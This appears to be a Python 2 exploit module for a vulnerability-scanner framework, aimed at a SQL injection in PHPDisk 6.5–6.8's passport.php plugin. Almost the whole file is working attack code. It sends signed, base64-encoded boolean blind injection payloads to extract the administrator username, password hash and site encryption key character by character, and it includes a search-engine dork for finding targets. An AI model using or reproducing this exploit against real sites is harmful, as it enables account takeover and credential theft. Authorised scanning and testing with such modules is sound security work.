# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import sys, urllib2, time, os , Queue, threading, re, base64, md5, hashlib, binascii, cookielib

class Vuln(ABVuln):
    vuln_id = 'PHPDisk_0002' # 平台漏洞编号，留空
    name = 'PHPDisk SQL Injection' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2013-08-05'  # 漏洞公布时间
    desc = '''
        # Title: Phpdisk SQL Injection Vulnerabilities
        # Google Dork: Powered by phpdisk.com
        file plugins\phpdisk_client\passport.php 参数过滤不严谨，导致注入可获得管理员密码。
    ''' # 漏洞描述
    ref = 'http://0day5.com/archives/690/,https://github.com/yaseng/pentest/blob/master/exploit/phpdisk-sql-injection.py' # 漏洞来源
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'PHPDisk'  # 漏洞应用名称
    product_version = ' 6.5- 6.8'  # 漏洞应用版本


# show message
def msg(text, type=0):
    if type == 0: 
       str_def = "[*]" 
    elif  type == 1: 
       str_def = "[+]"
    else:
       str_def = "[-]";
    print str_def + text;

# get url data     
def get_data(url):
    try:
        r = urllib2.urlopen(url, timeout=10)
        return r.read()
    except :
        return 0

def b(url):
    if   get_data(url).find("ssport Err",0) != -1 :
        return 0
    return 1

def make_plyload(payload):
    return   target+"?"+base64.b64encode("username=1&password=1&action=passportlogin&tpf="+payload+"&sign="+md5.new("passportlogin"+"1"+"1").hexdigest().upper()) 

def get_username():
    
    msg("get  username ...")
    global  pass_list
    len=0
    for i in range(40) :
        if  b(make_plyload("pd_users  WHERE 1   and   (SELECT  LENGTH(username)  from  pd_users where userid=%d )= %d  #" % (uid,i))):
            len=i
            msg("username length:%d" % len,1)
            break
    global  key_list
    key_list = ['0','1','2','3','4','5','6','7','8','9']
    key_list += map(chr,range(97,123)) 
    username = ""
    for i  in range(len) :
       for key in key_list :
            t=key
            if type(key) != int :
                t="0x"+binascii.hexlify(key)
            if(b(make_plyload(" pd_users WHERE 1   and   (SELECT  substr(username,%d,1)   from  pd_users  where userid=%d )=%s #" % (i+1,uid,t)))) :
                msg("username [%d]:%s" % (i+1,key))
                username+=key
                break       
    msg("username:"+username,1)    
    return  username 
    
 

def get_password():   
    
    pass_list=['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f']
    password=""
    for i  in range(32) :
        for key in pass_list :
            t=key
            if type(key) != int :
                t="0x"+binascii.hexlify(key)
            if(b(make_plyload(" pd_users WHERE 1   and   (SELECT  substr(password,%d,1)     from  pd_users  where userid=%d )= %s #" % (i+1,uid,t)))) :
                msg("password [%d]:%s" % (i+1,key))
                password+=key
                break       
    msg("username:"+password,1) 
    return password     
 
def get_encrypt_key():
    
    msg("get encrypt_key ...")
    global  pass_list
    pass_list=map(chr,range(97,123))
    len=0
    for i in range(40) :
        if  b(make_plyload("pd_users  WHERE 1   and   ( SELECT  LENGTH(value)  from  pd_settings  where        vars=0x656e63727970745f6b6579 )=%d  #23" % i)):
            len=i
            msg("encrypt_key length:%d" % len,1)
            break
    global  key_list
    key_list=['0','1','2','3','4','5','6','7','8','9']
    key_list+=map(chr,range(65,91)+range(97,123)) 
    encrypt_key=""
    for i  in range(len) :
        for key in key_list :
            t=key
            if type(key) != int :
                t="0x"+binascii.hexlify(key)
            if(b(make_plyload(" pd_users WHERE 1   and   ( SELECT  binary(substr(value,%d,1))  from  pd_settings  where        vars=0x656e63727970745f6b6579 )  = %s #" % (i+1,t)))) :
                msg("key [%d]:%s" % (i+1,key))
                encrypt_key+=key
                break    
    msg("encrypt_key:"+encrypt_key,1)    
    return  encrypt_key 


class Poc(ABPoc):
    poc_id = 'bcecb455-e911-4462-9f07-ca270c27ee0a'
    author = '47bwy'  # POC编写者
    create_date = '2018-08-13' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            if len(sys.argv) > 1:
                site = sys.argv[1];
            global target
            global uid
            target = self.target + "/plugins/phpdisk_client/passport.php"
            #print get_data(make_plyload(" pd_users WHERE 1   and   ( SELECT  substr(value,2,1)  from  pd_settings  where        vars=0x656e63727970745f6b6579 )  = 9 %23"))
            if get_data(target):
               username = get_username()
               if len(username) > 0 :
                    password=get_password()
                    if len(password) == 32 :
                        #msg("Succeed: username:%s  password:%s" % (username,password),1)

                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            if len(sys.argv) > 1:
                site = sys.argv[1];
            global target
            global uid
            try :
                uid=int(sys.argv[2]);
            except :
                uid =1
            target = self.target + "/plugins/phpdisk_client/passport.php"
            #print get_data(make_plyload(" pd_users WHERE 1   and   ( SELECT  substr(value,2,1)  from  pd_settings  where        vars=0x656e63727970745f6b6579 )  = 9 %23"))
            if get_data(target):
               username = get_username()
               if len(username) > 0 :
                    password=get_password()
                    if len(password) == 32 :
                        #msg("Succeed: username:%s  password:%s" % (username,password),1)

                        self.output.report(self.vuln, '发现{target}存在{name}漏洞，已获取到用户名：{username}，密码：{password}'.format(
                            target=self.target,name=self.vuln.name, username=username, password=password))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))
        

if __name__ == '__main__':
    Poc().run()